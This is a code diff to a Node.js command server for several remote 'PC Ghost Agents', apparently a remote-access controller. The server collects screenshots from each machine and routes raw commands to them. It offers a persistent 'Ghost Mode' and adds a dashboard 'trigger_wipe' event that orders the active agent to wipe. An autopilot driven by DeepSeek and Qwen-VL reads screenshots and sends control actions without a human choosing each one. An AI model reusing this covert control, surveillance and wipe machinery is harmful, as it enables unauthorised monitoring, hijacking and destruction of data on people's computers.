@@ -25,10 +25,10 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json({ limit: '50mb' })); // Naikkan had saiz JSON untuk screenshot
 
 // State Tracking
-let agentConnected = false;
-let agentSocketId = null;
+let agents = {}; // { socketId: { pcName: string, lastScreenshot: string } }
+let activeAgentSocketId = null;
 let currentMode = 'B'; // 'B' = Safety Mode (Heartbeat required), 'A' = Ghost Mode (Persistent)
-let aiConfig = { provider: 'openai', apiKey: '', autopilot: false, skill: 'default', customMission: '' };
+let aiConfig = { qwenKey: '', deepseekKey: '', autopilot: false, useVision: false, skill: 'default', customMission: '' };
 let lastScreenshot = null;
 let isAIBusy = false;
 let hybridCommandQueue = [];
@@ -36,8 +36,10 @@ let hybridCommandQueue = [];
 // API Endpoint to check status
 app.get('/api/status', (req, res) => {
   res.json({
-    agentOnline: agentConnected,
-    mode: currentMode
+    agentOnline: activeAgentSocketId !== null,
+    mode: currentMode,
+    activeAgent: activeAgentSocketId,
+    agentsCount: Object.keys(agents).length
   });
 });
 
@@ -46,7 +48,9 @@ app.post('/api/hybrid_upload', (req, res) => {
   const { screenshot } = req.body;
   if (!screenshot) return res.status(400).send('Missing screenshot');
   
-  lastScreenshot = screenshot;
+  if (activeAgentSocketId && agents[activeAgentSocketId]) {
+      agents[activeAgentSocketId].lastScreenshot = screenshot;
+  }
   io.emit('new_screenshot', screenshot);
   
   if (aiConfig.autopilot && !isAIBusy) {
@@ -70,23 +74,43 @@ io.on('connection', (socket) => {
   console.log(`[CONNECT] New connection: ${socket.id}`);
 
   // 1. Identify who is connecting (Agent or Web Dashboard)
-  socket.on('identify', (role) => {
+  socket.on('identify', (payload) => {
+    let role = typeof payload === 'string' ? payload : payload.role;
+    
     if (role === 'agent') {
-      agentConnected = true;
-      agentSocketId = socket.id;
-      console.log(`[AGENT] PC Ghost Agent connected! ID: ${socket.id}`);
+      let pcName = payload.pc_name || `Unknown-PC-${socket.id.substring(0,4)}`;
+      agents[socket.id] = { pcName: pcName, lastScreenshot: null, visionContext: '' };
       
-      // Notify all web clients that agent is online
+      // If this is the first agent, make it active
+      if (!activeAgentSocketId) {
+          activeAgentSocketId = socket.id;
+      }
+      
+      console.log(`[AGENT] PC Ghost Agent connected! ID: ${socket.id} Name: ${pcName}`);
+      
+      // Notify all web clients
       io.emit('agent_status', { online: true, mode: currentMode });
+      io.emit('agent_list', { agents: agents, active: activeAgentSocketId });
       
-      // Send the current mode to the agent immediately upon connection
       socket.emit('set_mode', currentMode);
     } else if (role === 'web') {
       console.log(`[WEB] Web Dashboard connected! ID: ${socket.id}`);
-      // Give the web dashboard the current status
-      socket.emit('agent_status', { online: agentConnected, mode: currentMode });
+      socket.emit('agent_status', { online: activeAgentSocketId !== null, mode: currentMode });
+      socket.emit('agent_list', { agents: agents, active: activeAgentSocketId });
       socket.emit('sync_ai_config', aiConfig);
     }
+  });
+  
+  socket.on('select_agent', (socketId) => {
+      if (agents[socketId]) {
+          activeAgentSocketId = socketId;
+          console.log(`[WEB] Active agent changed to: ${socketId}`);
+          io.emit('agent_list', { agents: agents, active: activeAgentSocketId });
+          // If the newly selected agent has a screenshot, show it immediately
+          if (agents[socketId].lastScreenshot) {
+              socket.emit('new_screenshot', agents[socketId].lastScreenshot);
+          }
+      }
   });
 
   // AI Config Update
@@ -104,13 +128,62 @@ io.on('connection', (socket) => {
     }
   });
 
+  // Vision Toggle
+  socket.on('toggle_vision', (enabled) => {
+    aiConfig.useVision = enabled;
+    io.emit('sync_ai_config', aiConfig);
+  });
+
+  // Scan Vision Request
+  socket.on('scan_vision', async () => {
+    let targetScreenshot = activeAgentSocketId && agents[activeAgentSocketId] ? agents[activeAgentSocketId].lastScreenshot : lastScreenshot;
+    if (targetScreenshot && aiConfig.qwenKey && !isAIBusy) {
+      console.log(`[AI] Scanning screen layout using Qwen-VL...`);
+      io.emit('error_msg', `Scanning screen layout using Qwen-VL...`);
+      isAIBusy = true;
+      try {
+        const qwen = new OpenAI({ apiKey: aiConfig.qwenKey, baseURL: 'https://dashscope-intl.aliyuncs.com/compatible-mode/v1' });
+        const response = await qwen.chat.completions.create({
+          model: "qwen-vl-plus",
+          messages: [
+            { role: "system", content: "You are a screen parser. Analyze the image and describe the layout. Do not generate JSON commands." },
+            { role: "user", content: [
+              { type: "text", text: "List all open applications, visible windows, and provide the exact (X,Y) coordinates of all important clickable buttons or text inputs." },
+              { type: "image_url", image_url: { url: `data:image/jpeg;base64,${targetScreenshot}` } }
+            ]}
+          ]
+        });
+        const scanResult = response.choices[0].message.content;
+        console.log(`[VISION SCAN] Completed.`);
+        io.emit('error_msg', `Screen Scan Complete. Data saved for DeepSeek.`);
+        if (activeAgentSocketId && agents[activeAgentSocketId]) {
+            agents[activeAgentSocketId].visionContext = scanResult;
+        }
+      } catch(err) {
+        console.error("Scan Vision Error:", err);
+        io.emit('error_msg', `Vision Scan Error: ${err.message}`);
+      } finally {
+        isAIBusy = false;
+      }
+    } else if (!aiConfig.qwenKey) {
+        io.emit('error_msg', 'Cannot scan screen: Qwen API Key is missing.');
+    }
+  });
+
   // 2. Receiving Screenshot from Agent
   socket.on('screenshot_data', (data) => {
-    lastScreenshot = data;
-    io.emit('new_screenshot', data);
+    if (agents[socket.id]) {
+        agents[socket.id].lastScreenshot = data;
+    }
     
-    if (aiConfig.autopilot && !isAIBusy) {
-       processAIScreenshot(data);
+    // Only forward screenshot and trigger AI if this is the currently active agent
+    if (socket.id === activeAgentSocketId) {
+        lastScreenshot = data;
+        io.emit('new_screenshot', data);
+        
+        if (aiConfig.autopilot && !isAIBusy) {
+           processAIScreenshot(data);
+        }
     }
   });
 
@@ -121,18 +194,20 @@ io.on('connection', (socket) => {
 
   // 4. Web Dashboard sends a command to the Agent
   socket.on('send_command', async (cmdString) => {
-    if (aiConfig.apiKey && lastScreenshot) {
+    let targetScreenshot = activeAgentSocketId && agents[activeAgentSocketId] ? agents[activeAgentSocketId].lastScreenshot : lastScreenshot;
+      
+    if ((aiConfig.qwenKey || aiConfig.deepseekKey) && targetScreenshot) {
       console.log(`[AI] User requested manual AI action: ${cmdString}`);
       io.emit('error_msg', `Asking AI: ${cmdString}...`);
-      await processAIScreenshot(lastScreenshot, cmdString);
+      await processAIScreenshot(targetScreenshot, cmdString);
     } else {
-      if (agentConnected && agentSocketId) {
-        console.log(`[COMMAND] Routing raw command to Agent: ${cmdString}`);
-        io.to(agentSocketId).emit('execute_command', cmdString);
+      if (activeAgentSocketId && agents[activeAgentSocketId]) {
+        console.log(`[COMMAND] Routing raw command to Active Agent (${activeAgentSocketId}): ${cmdString}`);
+        io.to(activeAgentSocketId).emit('execute_command', cmdString);
       } else {
         console.log(`[COMMAND] Queuing raw command (Hybrid Mode): ${cmdString}`);
         hybridCommandQueue.push(cmdString);
-        socket.emit('error_msg', 'Agent is offline via Socket. Command queued for Hybrid Mode.');
+        socket.emit('error_msg', 'No active agent connected. Command queued for Hybrid Mode.');
       }
     }
   });
@@ -143,22 +218,36 @@ io.on('connection', (socket) => {
     currentMode = newMode;
     
     // Broadcast status change to everyone
-    io.emit('agent_status', { online: agentConnected, mode: currentMode });
+    io.emit('agent_status', { online: activeAgentSocketId !== null, mode: currentMode });
     
-    // Tell the agent to change its behavior
-    if (agentConnected && agentSocketId) {
-      io.to(agentSocketId).emit('set_mode', currentMode);
+    // Tell all agents to change behavior
+    for (let sockId in agents) {
+      io.to(sockId).emit('set_mode', currentMode);
+    }
+  });
+
+  // 6. Web Dashboard triggers Wipe
+  socket.on('trigger_wipe', () => {
+    console.log(`[WIPE] Wipe command triggered by Dashboard for active agent!`);
+    if (activeAgentSocketId && agents[activeAgentSocketId]) {
+      io.to(activeAgentSocketId).emit('trigger_wipe');
     }
   });
 
   // Handle Disconnection
   socket.on('disconnect', () => {
     console.log(`[DISCONNECT] ${socket.id} disconnected.`);
-    if (socket.id === agentSocketId) {
-      console.log(`[AGENT] PC Ghost Agent went offline!`);
-      agentConnected = false;
-      agentSocketId = null;
-      io.emit('agent_status', { online: false, mode: currentMode });
+    
+    if (agents[socket.id]) {
+      let name = agents[socket.id].pcName;
+      console.log(`[AGENT] PC Ghost Agent (${name}) went offline!`);
+      delete agents[socket.id];
+      
+      if (socket.id === activeAgentSocketId) {
+          activeAgentSocketId = Object.keys(agents).length > 0 ? Object.keys(agents)[0] : null;
+          io.emit('agent_status', { online: activeAgentSocketId !== null, mode: currentMode });
+      }
+      io.emit('agent_list', { agents: agents, active: activeAgentSocketId });
     }
   });
 });
@@ -172,7 +261,7 @@ server.listen(PORT, () => {
 
 // AI Logic
 async function processAIScreenshot(imageBase64, customPrompt = null) {
-  if (!aiConfig.apiKey) return;
+  if (!aiConfig.qwenKey && !aiConfig.deepseekKey) return;
   isAIBusy = true;
   try {
     let result = null;
@@ -203,12 +292,21 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
         }
     }
 
-    const promptText = customPrompt || `${basePrompt}\n\n${missionInstruction}`;
+    let promptText = customPrompt || `${basePrompt}\n\n${missionInstruction}`;
 
-    if (aiConfig.provider === 'openai') {
-      const openai = new OpenAI({ apiKey: aiConfig.apiKey });
-      const response = await openai.chat.completions.create({
-        model: "gpt-4o",
+    // Inject visionContext if available
+    if (activeAgentSocketId && agents[activeAgentSocketId] && agents[activeAgentSocketId].visionContext) {
+        promptText += `\n\n[PREVIOUS VISION SCAN LAYOUT DATA FOR CONTEXT]\n${agents[activeAgentSocketId].visionContext}\n[END VISION SCAN]`;
+    }
+
+    // Determine primary provider: Always DeepSeek if available, otherwise Qwen
+    let primaryProvider = aiConfig.deepseekKey ? 'deepseek' : (aiConfig.qwenKey ? 'qwen' : null);
+    if (!primaryProvider) return;
+
+    if (primaryProvider === 'qwen') {
+      const qwen = new OpenAI({ apiKey: aiConfig.qwenKey, baseURL: 'https://dashscope-intl.aliyuncs.com/compatible-mode/v1' });
+      const response = await qwen.chat.completions.create({
+        model: "qwen-vl-plus",
         messages: [
           { role: "system", content: "You are an autonomous computer control agent. Respond only with valid JSON." },
           { role: "user", content: [
@@ -219,39 +317,18 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
         response_format: { type: "json_object" }
       });
       result = response.choices[0].message.content;
-    } else if (aiConfig.provider === 'deepseek') {
-      const openai = new OpenAI({ apiKey: aiConfig.apiKey, baseURL: 'https://api.deepseek.com/v1' });
-      const response = await openai.chat.completions.create({
+      
+    } else if (primaryProvider === 'deepseek') {
+      const ds = new OpenAI({ apiKey: aiConfig.deepseekKey, baseURL: 'https://api.deepseek.com/v1' });
+      const response = await ds.chat.completions.create({
         model: "deepseek-chat",
         messages: [
           { role: "system", content: "You are an autonomous computer control agent. Respond only with valid JSON." },
-          { role: "user", content: promptText + "\n[Note: You are currently operating blind. The user's screen is not visible to you. Generate logical generic actions like Win+R or browser navigation.]" }
+          { role: "user", content: promptText + "\n[Note: You are currently operating blind. The user's screen is not visible to you. Generate logical generic actions like Win+R or browser navigation. If you need screen coordinates, you can use the request_vision action.]" }
         ],
         response_format: { type: "json_object" }
       });
       result = response.choices[0].message.content;
-    } else if (aiConfig.provider === 'gemini') {
-      const genAI = new GoogleGenerativeAI(aiConfig.apiKey);
-      const model = genAI.getGenerativeModel({ model: "gemini-1.5-pro", generationConfig: { responseMimeType: "application/json" } });
-      const response = await model.generateContent([
-        promptText,
-        { inlineData: { data: imageBase64, mimeType: "image/jpeg" } }
-      ]);
-      result = response.response.text();
-    } else if (aiConfig.provider === 'anthropic') {
-      const anthropic = new Anthropic({ apiKey: aiConfig.apiKey });
-      const response = await anthropic.messages.create({
-        model: "claude-3-5-sonnet-20241022",
-        max_tokens: 1024,
-        messages: [{
-          role: "user",
-          content: [
-            { type: "image", source: { type: "base64", media_type: "image/jpeg", data: imageBase64 } },
-            { type: "text", text: promptText + " Respond with JSON only. No markdown formatting like ```json." }
-          ]
-        }]
-      });
-      result = response.content[0].text;
     }
 
     console.log(`[AI RESULT] ${result}`);
@@ -263,9 +340,44 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
       }
       
       const parsed = JSON.parse(cleanResult);
-      if (parsed.action && parsed.action !== "nothing") {
-        if (agentConnected && agentSocketId) {
-          io.to(agentSocketId).emit('execute_json_command', parsed);
+      
+      // Handle the special request_vision action
+      if (parsed.action === "request_vision") {
+          if (aiConfig.useVision && aiConfig.qwenKey) {
+              console.log("[AI] DeepSeek requested vision. Calling Qwen-VL internally...");
+              io.emit('error_msg', "DeepSeek requested vision coordinates. Scanning screen...");
+              
+              const qwen = new OpenAI({ apiKey: aiConfig.qwenKey, baseURL: 'https://dashscope-intl.aliyuncs.com/compatible-mode/v1' });
+              const visionResponse = await qwen.chat.completions.create({
+                model: "qwen-vl-plus",
+                messages: [
+                  { role: "system", content: "You are a screen parser. Analyze the image and describe the layout. Do not generate JSON commands." },
+                  { role: "user", content: [
+                    { type: "text", text: "List all open applications, visible windows, and provide the exact (X,Y) coordinates of all important clickable buttons or text inputs." },
+                    { type: "image_url", image_url: { url: `data:image/jpeg;base64,${imageBase64}` } }
+                  ]}
+                ]
+              });
+              
+              const scanResult = visionResponse.choices[0].message.content;
+              if (activeAgentSocketId && agents[activeAgentSocketId]) {
+                  agents[activeAgentSocketId].visionContext = scanResult;
+              }
+              
+              console.log("[AI] Vision scan complete. Re-prompting DeepSeek...");
+              io.emit('error_msg', "Scan complete. DeepSeek is re-evaluating...");
+              
+              // We successfully got vision. Run the process again so DeepSeek can see it.
+              // Set isAIBusy = false temporarily so the recursive call doesn't get blocked
+              isAIBusy = false;
+              return await processAIScreenshot(imageBase64, customPrompt);
+          } else {
+              io.emit('error_msg', "DeepSeek requested vision, but Vision AI is toggled OFF or Qwen Key is missing.");
+              console.log("[AI] Denied vision request.");
+          }
+      } else if (parsed.action && parsed.action !== "nothing") {
+        if (activeAgentSocketId && agents[activeAgentSocketId]) {
+          io.to(activeAgentSocketId).emit('execute_json_command', parsed);
           io.emit('error_msg', `AI action dispatched: ${parsed.action}`);
         } else {
           hybridCommandQueue.push(JSON.stringify(parsed));
@@ -276,7 +388,11 @@ async function processAIScreenshot(imageBase64, customPrompt = null) {
   } catch (err) {
     console.error("[AI ERROR]", err);
     io.emit('error_msg', `AI Error: ${err.message}`);
-  } finally {
     isAIBusy = false;
+  } finally {
+    // Add a 5 second cooldown before AI can process the next screenshot to prevent spam
+    setTimeout(() => {
+        isAIBusy = false;
+    }, 5000);
   }
 }
